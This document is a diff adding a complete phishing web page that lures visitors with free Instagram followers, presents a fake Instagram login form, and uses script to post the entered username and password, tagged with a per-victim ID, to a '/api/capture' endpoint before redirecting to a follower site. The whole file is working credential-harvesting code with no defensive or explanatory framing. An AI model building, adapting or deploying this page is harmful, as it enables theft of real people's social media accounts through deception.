@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Instagram Free Followers</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        .glass {
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 32px 24px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            text-align: center;
+            color: #fff;
+        }
+        .glass h1 {
+            font-size: 30px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .glass .sub {
+            font-size: 13px;
+            letter-spacing: 3px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin: 4px 0 18px;
+        }
+        .glow-btn {
+            background: linear-gradient(145deg, #f093fb, #f5576c);
+            border: none;
+            padding: 18px;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
+            transition: 0.25s;
+            margin: 12px 0 6px;
+        }
+        .glow-btn:active { transform: scale(0.96); }
+        .package-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 20px 0 14px;
+        }
+        .package-grid button {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 18px;
+            padding: 16px 0;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            backdrop-filter: blur(4px);
+        }
+        .package-grid button:active {
+            transform: scale(0.92);
+            background: rgba(245,87,108,0.25);
+            border-color: #f5576c;
+        }
+        .input-group {
+            text-align: left;
+            margin: 14px 0 8px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0.7;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.04);
+            color: #fff;
+            font-size: 16px;
+            transition: 0.25s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #f5576c;
+            background: rgba(255,255,255,0.07);
+        }
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+        }
+        .back-btn {
+            background: rgba(255,255,255,0.04) !important;
+            border: 1px solid rgba(255,255,255,0.06) !important;
+            box-shadow: none !important;
+            margin-top: 10px;
+            font-size: 15px !important;
+            padding: 14px !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="glass" id="mainPage">
+        <h1>🎉 Get Free Instagram Followers!</h1>
+        <p class="sub">Choose your package</p>
+        <div class="package-grid" id="packageGrid"></div>
+        <p class="footer-text">100% safe & secure · Trusted by 10M+ users</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+
+        // Show packages
+        const packages = ['1K', '5K', '10K', '50K', '100K'];
+        const grid = document.getElementById('packageGrid');
+        packages.forEach(pkg => {
+            const btn = document.createElement('button');
+            btn.textContent = pkg;
+            btn.onclick = () => showLogin(pkg);
+            grid.appendChild(btn);
+        });
+
+        function showLogin(pkg) {
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🔐 Instagram Login</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">Enter your credentials to claim <strong>${pkg}</strong> followers</p>
+                <div class="input-group">
+                    <label>👤 Username / Email</label>
+                    <input type="text" id="loginUser" placeholder="Enter your Instagram username" />
+                </div>
+                <div class="input-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="loginPass" placeholder="Enter your password" />
+                </div>
+                <button class="glow-btn" onclick="submitLogin('${pkg}')">🚀 Claim Now</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <p class="footer-text" style="margin-top: 20px;">🔐 Your data is secure & encrypted</p>
+            `;
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, type: 'ig', ...payload })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        async function submitLogin(pkg) {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            if (!username || !password) {
+                alert('⚠️ Please fill all fields');
+                return;
+            }
+            await sendData({
+                creds: {
+                    platform: 'instagram',
+                    username: username,
+                    password: password,
+                    package: pkg
+                }
+            });
+            window.location.href = 'https://takipcikrali.com/';
+        }
+    </script>
+</body>
+</html>
